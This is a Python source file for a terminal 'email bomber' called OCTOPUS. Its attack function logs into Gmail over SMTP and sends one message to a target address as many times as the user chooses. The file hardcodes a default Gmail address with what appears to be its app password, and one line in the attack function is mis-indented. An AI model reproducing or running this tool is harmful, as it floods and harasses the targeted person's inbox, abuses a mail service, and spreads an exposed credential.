import time
import os
import smtplib
from datetime import datetime
from webbrowser import open
from getpass import getuser
from pystyle import Anime, Write, Center, Colors, Colorate
from colorama import Fore
import platform
from email.message import EmailMessage
os.system(f'cls' if {os.name} == 'nt' else 'clear')
#--------------------------------------------w-------------------------------------------
url2 = "https://github.com/secrtworld/"
def_email = ['ghos123456789amam@gmail.com', 'rykuvkuhutrnpxrz']


def attack():
      mail = smtplib.SMTP("SMTP.gmail.com",587)
    try:
        target = Write.Input("Enter Taget Email Adders>>>", Colors.blue_to_green)
        email = Write.Input("Do You Want Use A Default Email? If Yes Enter [y] else [n] >>>", Colors.blue_to_red)
        if email == "y":
            email = def_email[0]
            password = def_email[1]
        else:
            email = Write.Input("Enter Your Email>>>", Colors.blue_to_red)
            password = Write.Input("Enter Password>>>", Colors.blue_to_green)
        message = Write.Input("\nEnter Message>>>", Colors.blue_to_black)
        counter = int(Write.Input("How Many Message You Want To Send>>>", Colors.black_to_green))
        subject = Write.Input("Enter Subject>>>", Colors.blue_to_green) 
        kos = EmailMessage()
        kos['From'] = email
        kos['Subject'] = subject
        kos['To'] = target
        mail.ehlo()
        mail.starttls()
        mail.login(email, password)
        for x in range(0, counter):
            print(Fore.GREEN + f"Message Number {x + 1} Sent")
            mail.send_message(kos)
        Write.Print("Message Sent Successfully", Colors.green_to_red)
    except Exception as ex:
          print(f" EROR: {ex}")
#------------------------------------------------------------------------------------------    
def help():
    baby4 = Fore.LIGHTWHITE_EX+"--update for updateing"
    baby5 = Fore.LIGHTBLACK_EX+"--attack for attack"
    baby6 = Fore.CYAN+"--p for Protection"
    baby7 = Fore.WHITE+"--exit For Exit"
    baby8 = Fore.YELLOW+"--help for help"
    baby9 = Fore.LIGHTRED_EX+"Link My GitHub: https://github.com/secrtworld/"
    print(f"{baby4}\n{baby5}\n{baby6}\n{baby7}\n{baby8}\n{baby9}\n'Made by Nothing.....'")
    
def update():
    open('https://github.com/secrtworld/OCTOPUS/')

def p():
    url = 'https://github.com/secrtworld/'
    open(url)

def banner():
    ss = f"""   
  email bomber$$    Made  By: Nothing            {datetime.now()}       pytho team
 ▄██████▄   ▄████████     ███      ▄██████▄     ▄███████▄ ███    █▄     ▄████████ 
███    ███ ███    ███ ▀█████████▄ ███    ███   ███    ███ ███    ███   ███    ███ 
███    ███ ███    █▀     ▀███▀▀██ ███    ███   ███    ███ ███    ███   ███    █▀  
███    ███ ███            ███   ▀ ███    ███   ███    ███ ███    ███   ███        
███    ███ ███            ███     ███    ███ ▀█████████▀  ███    ███ ▀███████████ 
███    ███ ███    █▄      ███     ███    ███   ███        ███    ███          ███ 
███    ███ ███    ███     ███     ███    ███   ███        ███    ███    ▄█    ███ 
 ▀██████▀  ████████▀     ▄████▀    ▀██████▀   ▄████▀      ████████▀   ▄████████▀  
                                                                           v1.0.0
                                                                           os = {platform.uname()[0]}  {platform.uname()[3]} {platform.uname()[5]}"""
    Anime.Fade(Center.Center(ss), Colors.blue_to_purple, Colorate.Horizontal, enter=True)

def banner2():
    import pystyle
    baby = Fore.GREEN+f"""   pytho team
  {datetime.now().date()}     {datetime.now().time()}
  ██████╗  ██████╗████████╗ ██████╗ ██████╗ ██╗   ██╗███████╗
██╔═══██╗██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗██║   ██║██╔════╝"""
    baby2=Fore.RED+'''
██║   ██║██║        ██║   ██║   ██║██████╔╝██║   ██║███████╗'''
    baby3=Fore.BLUE+f'''
██║   ██║██║nothing ██║   ██║   ██║██╔═══╝ ██║   ██║╚════██║
╚██████╔╝╚██████╗   ██║   ╚██████╔╝██║     ╚██████╔╝███████║
 ╚═════╝  ╚═════╝   ╚═╝    ╚═════╝ ╚═╝      ╚═════╝ ╚══════╝os name =  {platform.uname()[0]}'''
    baby4 = Fore.LIGHTWHITE_EX+"--update for updateing"
    baby5 = Fore.LIGHTBLACK_EX+"--attack for attack"
    baby6 = Fore.CYAN+"--p for Protection"
    baby7 = Fore.WHITE+"--exit For Exit"
    baby8 = Fore.YELLOW+"--help for help"
    baby9 = Fore.LIGHTRED_EX+"Link My GitHub: https://github.com/secrtworld/"
 
    print(f"{baby}{baby2}{baby3}\n{baby4}\n{baby5}\n{baby6}\n{baby7}\n{baby8}\n{Fore.RED}{baby9}\n'Made by Nothing.....'")
banner()
banner2()
while True:
    try:
        ss = input(Fore.RED+f'╔═══[root@{getuser()}]\n╚════════{platform.uname()[1]}══════{datetime.now().time()}═══════>>>>>')
        if ss == "":
            continue
        elif ss == "--update":
            update()
        elif ss == "--attack":
            attack()
        elif ss == "--p":
            p()
        elif ss == "--h" or ss == "--help" or ss == "help" or ss == "h":
            help()
        elif ss == "--exit":
            Write.Print(f"{getuser()} quitting....", Colors.cyan_to_green)
            time.sleep(2)
            Write.Print('''Thanks For Run it\nMade By Nothing\nPYTHO TEAM\nLink My GitHub: https://github.com/secrtworld/''', Colors.green_to_black)
            open(url2)
            break
        else:
            Write.Print("Command Not Fund\n", Colors.red_to_black)
    except Exception as ex:
        print(f"EORO: {ex}")
